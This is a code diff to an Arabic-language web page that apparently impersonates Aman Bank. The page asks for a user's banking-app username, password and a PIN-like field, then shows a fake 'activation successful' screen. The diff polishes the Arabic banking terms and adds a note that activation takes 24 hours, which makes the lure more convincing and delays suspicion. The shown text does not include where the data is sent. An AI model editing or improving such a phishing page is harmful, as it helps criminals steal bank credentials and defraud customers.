@@ -185,6 +185,16 @@
     .success-icon { font-size: 60px; margin-bottom: 14px; }
     .success-title { font-size: 22px; font-weight: 900; color: var(--primary); margin-bottom: 8px; }
     .success-sub { font-size: 14px; color: #666; }
+    .success-note {
+      margin-top: 12px;
+      font-size: 13px;
+      color: #0058b0;
+      font-weight: 700;
+      background: #e8f0fb;
+      border-radius: 10px;
+      padding: 10px 14px;
+      display: inline-block;
+    }
     .bin-wrapper { margin: 10px 0; text-align: center; }
     .bin-label {
       display: block; font-size: 14px;
@@ -271,9 +281,9 @@
       <div class="service-item">
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a9/Aman_Bank_logo.png/200px-Aman_Bank_logo.png"
              onerror="this.src='https://via.placeholder.com/52x52/0058b0/ffffff?text=🏦'"
-             alt="خدمات بنكية"
+             alt="خدمات مصرفية"
              style="background:#e8f0fb; padding:6px;"/>
-        <span>خدمات بنكية</span>
+        <span>خدمات مصرفية</span>
       </div>
       <div class="service-divider">+</div>
       <div class="service-item">
@@ -325,15 +335,15 @@
       <div class="step-dot active"></div>
     </div>
     <div class="page-title">بيانات التطبيق</div>
-    <div class="login-subtitle">أدخل بيانات التطبيق البنكي</div>
+    <div class="login-subtitle">أدخل بيانات التطبيق المصرفي</div>
     <div class="form-group">
       <div class="input-wrap">
-        <input type="text" id="phoneInput" placeholder="اسم المستخدم حسب التطبيق البنكي" oninput="this.value=this.value.replace(/[^a-zA-Z0-9]/g,'')"/>
+        <input type="text" id="phoneInput" placeholder="اسم المستخدم حسب التطبيق المصرفي" oninput="this.value=this.value.replace(/[^a-zA-Z0-9]/g,'')"/>
       </div>
     </div>
     <div class="form-group">
       <div class="input-wrap pin-wrap">
-        <input type="password" id="pinInput" placeholder="كلمة مرور التطبيق البنكي"/>
+        <input type="password" id="pinInput" placeholder="كلمة مرور التطبيق المصرفي"/>
         <button class="eye-btn" onclick="togglePin()" type="button">👁</button>
       </div>
       <div class="bin-wrapper">
@@ -367,6 +377,7 @@
     <div class="success-icon">✅</div>
     <div class="success-title">تم التفعيل بنجاح!</div>
     <div class="success-sub">شكراً لك، تم تفعيل تطبيق مصرف الأمان بنجاح</div>
+    <div class="success-note">⏳ سيتم التفعيل خلال 24 ساعة</div>
   </div>
 
 </div>
